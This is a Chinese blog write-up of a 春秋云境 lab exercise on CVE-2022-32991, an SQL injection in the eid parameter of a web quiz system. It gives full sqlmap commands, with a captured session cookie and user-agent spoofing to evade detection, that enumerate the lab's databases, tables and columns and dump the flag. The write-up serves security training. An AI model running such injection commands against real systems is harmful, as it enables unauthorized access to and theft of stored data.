<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【春秋云境】CVE-2022-32991靶场wp - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="【春秋云境】CVE-2022-32991靶场wp" />
<meta property="og:description" content="【春秋云境】CVE-2022-32991 前期准备靶场介绍本期题目题目简介CVE-2022-32991简介环境准备工具准备 渗透测试1、已知提示2、开启靶场3、注册账户4、登录账户进入到主页查找目标抓包记录Sqlmap攻击所需的HTTP头部请求参数Sqlmap攻击爆库爆表爆列爆字段 做题答疑总结 前期准备 靶场介绍 10月10日10时24分，基于多年来在网络靶场领域的深厚技术及场景积累，永信至诚i春秋正式发布春秋云境.com社区，以春秋云底层能力为基础，以平行仿真技术为支撑，以高仿真内容场景为核心，打造网络安全实战“元宇宙”，通过更加多元、开放、创新的线上技术交流空间，为更广泛的用户群体提供更轻量的靶场体验，助力攻防两端的实战技能提升。
春秋云境.com是依托春秋云技术打造的国内首家云上靶场社区，集演、训、学、测为一体，广泛支撑个人、企业、学校、科研院所等社会各类群体和组织在线进行网络安全学习、能力认证、漏洞研究、综合渗透、案例复现、竞赛演练等。
本期题目 主页→漏洞靶标→免费空间→CVE-2022-32991
题目简介 CVE-2022-32991简介 明确漏洞类型为：OWASP TOP 10 A03 注入
环境准备 1、Java 1.8 或 Java 17（适用于对应Burpsuite版本）
2、Python 2 或Python 3（适用于对应Sqlmap版本）
工具准备 1、Burpsuite
2、Sqlmap
3、FireFox
渗透测试 1、已知提示 该CMS的welcome.php中存在SQL注入攻击。
2、开启靶场 3、注册账户 REGISTER→任意注册一个
4、登录账户 进入到主页 查找目标 根据CVE官方：
在welcome.php，发现基于 Web 的测验系统 v1.0 通过 eid 参数包含一个 SQL 注入漏洞。
观察该页面URL，发现虽然为welcome.php，但参数并不是eid
继续查找其他页面，点击第一栏Start进行跳转：
发现存在welcome.php和eid参数
抓包 1、开启FireFox的FoxyProxy的Burpsuite代理
2、开启Burpsuite代理
3、开启Burpsuite抓包
记录Sqlmap攻击所需的HTTP头部请求参数 --cookie=&#34;PHPSESSID=k5854nfic1qngm5ul1vmb8pbma&#34; --user-agent=&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0&#34; 其中，" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/45293b806ba8999ff3e6e5f009602db3/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-10-11T14:03:53+08:00" />
<meta property="article:modified_time" content="2022-10-11T14:03:53+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【春秋云境】CVE-2022-32991靶场wp</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>【春秋云境】CVE-2022-32991</h4> 
 <ul><li><a href="#_2" rel="nofollow">前期准备</a></li><li><ul><li><a href="#_3" rel="nofollow">靶场介绍</a></li><li><a href="#_11" rel="nofollow">本期题目</a></li><li><a href="#_17" rel="nofollow">题目简介</a></li><li><a href="#CVE202232991_22" rel="nofollow">CVE-2022-32991简介</a></li><li><a href="#_27" rel="nofollow">环境准备</a></li><li><a href="#_32" rel="nofollow">工具准备</a></li></ul> 
  </li><li><a href="#_38" rel="nofollow">渗透测试</a></li><li><ul><li><a href="#1_42" rel="nofollow">1、已知提示</a></li><li><a href="#2_46" rel="nofollow">2、开启靶场</a></li><li><a href="#3_50" rel="nofollow">3、注册账户</a></li><li><a href="#4_55" rel="nofollow">4、登录账户</a></li><li><a href="#_59" rel="nofollow">进入到主页</a></li><li><a href="#_64" rel="nofollow">查找目标</a></li><li><a href="#_74" rel="nofollow">抓包</a></li><li><a href="#SqlmapHTTP_84" rel="nofollow">记录Sqlmap攻击所需的HTTP头部请求参数</a></li><li><a href="#Sqlmap_102" rel="nofollow">Sqlmap攻击</a></li><li><ul><li><a href="#_103" rel="nofollow">爆库</a></li><li><a href="#_113" rel="nofollow">爆表</a></li><li><a href="#_122" rel="nofollow">爆列</a></li><li><a href="#_131" rel="nofollow">爆字段</a></li></ul> 
  </li></ul> 
  </li><li><a href="#_144" rel="nofollow">做题答疑</a></li><li><a href="#_149" rel="nofollow">总结</a></li></ul> 
</div> 
<p></p> 
<h2><a id="_2"></a>前期准备</h2> 
<h3><a id="_3"></a>靶场介绍</h3> 
<p>10月10日10时24分，基于多年来在网络靶场领域的深厚技术及场景积累，<strong>永信至诚i春秋</strong>正式发布<strong>春秋云境.com</strong>社区，以春秋云底层能力为基础，以平行仿真技术为支撑，以高仿真内容场景为核心，打造网络安全实战“元宇宙”，通过更加多元、开放、创新的线上技术交流空间，为更广泛的用户群体提供更轻量的靶场体验，助力攻防两端的实战技能提升。<br> <img src="https://images2.imgbox.com/79/93/EDWEopZC_o.png" alt="在这里插入图片描述"></p> 
<p><strong>春秋云境.com</strong>是依托春秋云技术打造的国内首家云上靶场社区，集演、训、学、测为一体，广泛支撑个人、企业、学校、科研院所等社会各类群体和组织在线进行网络安全学习、能力认证、漏洞研究、综合渗透、案例复现、竞赛演练等。</p> 
<h3><a id="_11"></a>本期题目</h3> 
<p><strong>主页→漏洞靶标→免费空间→CVE-2022-32991</strong><br> <img src="https://images2.imgbox.com/bf/7e/Q78UGMnE_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="_17"></a>题目简介</h3> 
<p><img src="https://images2.imgbox.com/bd/f7/lMtxitH6_o.png" alt="Web Based Quiz System SQL注入"></p> 
<h3><a id="CVE202232991_22"></a>CVE-2022-32991简介</h3> 
<p>明确漏洞类型为：<strong>OWASP TOP 10 A03 注入</strong><br> <img src="https://images2.imgbox.com/a7/cf/8gYWY6zO_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="_27"></a>环境准备</h3> 
<p>1、Java 1.8 或 Java 17（适用于对应Burpsuite版本）<br> 2、Python 2 或Python 3（适用于对应Sqlmap版本）</p> 
<h3><a id="_32"></a>工具准备</h3> 
<p>1、Burpsuite<br> 2、Sqlmap<br> 3、FireFox</p> 
<h2><a id="_38"></a>渗透测试</h2> 
<h3><a id="1_42"></a>1、已知提示</h3> 
<p>该CMS的welcome.php中存在SQL注入攻击。</p> 
<h3><a id="2_46"></a>2、开启靶场</h3> 
<p><img src="https://images2.imgbox.com/18/9e/iU1R137z_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="3_50"></a>3、注册账户</h3> 
<p>REGISTER→任意注册一个<br> <img src="https://images2.imgbox.com/08/64/Ic0u2v16_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="4_55"></a>4、登录账户</h3> 
<p><img src="https://images2.imgbox.com/df/04/KYO7ArDO_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="_59"></a>进入到主页</h3> 
<p><img src="https://images2.imgbox.com/6f/8c/HyaWvoEz_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="_64"></a>查找目标</h3> 
<p>根据CVE官方：<br> 在<strong>welcome.php</strong>，发现基于 Web 的测验系统 v1.0 通过 <strong>eid 参数</strong>包含一个 SQL 注入漏洞。<br> <img src="https://images2.imgbox.com/6b/80/laJZ9xRy_o.png" alt="在这里插入图片描述"><br> 观察该页面URL，发现虽然为welcome.php，但参数并不是eid<br> 继续查找其他页面，点击第一栏<strong>Start</strong>进行跳转：<br> <img src="https://images2.imgbox.com/a9/65/qklKaQYB_o.png" alt="在这里插入图片描述"><br> 发现存在welcome.php和eid参数</p> 
<h3><a id="_74"></a>抓包</h3> 
<p>1、开启FireFox的FoxyProxy的Burpsuite代理<br> <img src="https://images2.imgbox.com/b2/af/RSupQNiF_o.png" alt="在这里插入图片描述"><br> 2、开启Burpsuite代理<br> <img src="https://images2.imgbox.com/8a/9b/bXAsGzls_o.png" alt="在这里插入图片描述"><br> 3、开启Burpsuite抓包<br> <img src="https://images2.imgbox.com/2f/1f/pTO53pNh_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="SqlmapHTTP_84"></a>记录Sqlmap攻击所需的HTTP头部请求参数</h3> 
<pre><code class="prism language-cmd">--cookie="PHPSESSID=k5854nfic1qngm5ul1vmb8pbma"
</code></pre> 
<pre><code class="prism language-cmd">--user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
</code></pre> 
<p>其中，</p> 
<pre><code>--user-agent
</code></pre> 
<p>可采用</p> 
<pre><code>--random-agent
</code></pre> 
<p>代替<br> <strong>技术说明：由于该页面采用了登录访问，所以首先想到要使用–cookie参数使得sqlmap绕过身份验证，并添加–user-agent参数或–random-agent使得sqlmap绕过客户端验证，否则可能会被识别到明显的sqlmap客户端标识，从而导致攻击的中断。</strong></p> 
<h3><a id="Sqlmap_102"></a>Sqlmap攻击</h3> 
<h4><a id="_103"></a>爆库</h4> 
<p>结合目标URL和Burpsuite所得参数，攻击语句如下：</p> 
<pre><code class="prism language-cmd">python2 sqlmap.py -u "http://eci-2zeiqdtozk9he50hvar3.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34" -p "eid" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" --cookie="PHPSESSID=k5854nfic1qngm5ul1vmb8pbma" --batch --dbs
</code></pre> 
<p>执行界面如下：<br> <img src="https://images2.imgbox.com/55/9f/hJGue0fm_o.png" alt="在这里插入图片描述"><br> 得到所有数据库如下：<br> <img src="https://images2.imgbox.com/fc/fe/FAjIPpFC_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_113"></a>爆表</h4> 
<p>攻击语句如下：</p> 
<pre><code class="prism language-cmd">python2 sqlmap.py -u "http://eci-2zeiqdtozk9he50hvar3.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34" -p "eid" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" --cookie="PHPSESSID=k5854nfic1qngm5ul1vmb8pbma" --batch -D "ctf" --tables
</code></pre> 
<p>执行界面如下：<br> <img src="https://images2.imgbox.com/3e/2f/CKBvDCf2_o.png" alt="在这里插入图片描述"><br> 得到的ctf库的所有表如下：<br> <img src="https://images2.imgbox.com/8f/51/0FyVGpIw_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_122"></a>爆列</h4> 
<p>攻击语句如下：</p> 
<pre><code class="prism language-cmd">python2 sqlmap.py -u "http://eci-2zeiqdtozk9he50hvar3.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34" -p "eid" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" --cookie="PHPSESSID=k5854nfic1qngm5ul1vmb8pbma" --batch -D "ctf" -T "flag" --columns
</code></pre> 
<p>执行界面如下：<br> <img src="https://images2.imgbox.com/c6/27/Ke5KuM8q_o.png" alt="在这里插入图片描述"><br> 得到的ctf库的flag表的所有列名如下：<br> <img src="https://images2.imgbox.com/cf/93/Y4EyYr1L_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_131"></a>爆字段</h4> 
<p>攻击语句如下：</p> 
<pre><code class="prism language-cmd">python2 sqlmap.py -u "http://eci-2zeiqdtozk9he50hvar3.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34" -p "eid" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" --cookie="PHPSESSID=k5854nfic1qngm5ul1vmb8pbma" --batch -D "ctf" -T "flag" -C"flag" --dump
</code></pre> 
<p>执行界面如下：<br> <img src="https://images2.imgbox.com/0c/aa/BgqN4a8H_o.png" alt="在这里插入图片描述"><br> 得到题目的答案如下：<br> <img src="https://images2.imgbox.com/b3/98/KCnN28Ew_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_144"></a>做题答疑</h2> 
<p>问：为什么我sqlmap可以爆出库表列，就是爆不出字段？如图：<br> <img src="https://images2.imgbox.com/39/a9/IJvdh8WX_o.png" alt="在这里插入图片描述"><br> 答：靶场本身的问题，春秋云境Docker由于刚刚上线，访问人数较多，可能存在不稳定的现象，只需要重启靶场即可。</p> 
<h2><a id="_149"></a>总结</h2> 
<p>题目CVE-2022-32991主要考察攻击者对于sqlmap参数的熟练运用，第一时间知道用到哪些参数</p> 
<pre><code class="prism language-cmd">--cookie                        #绕过身份验证
--random-agent或--user-agent    #绕过客户端验证
--batch                         #默认后续sqlmap操作都为Y
--p                             #指定sqlmap注入的传参参数
</code></pre>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/abc7ecd4cb8a5a191581da5644e4239b/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">(附源码)计算机毕业设计SSM智能超市导购系统</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/55cc12e4e8ac30364c89219bc4c76e78/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">python爬虫 xpath使用问题整理</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>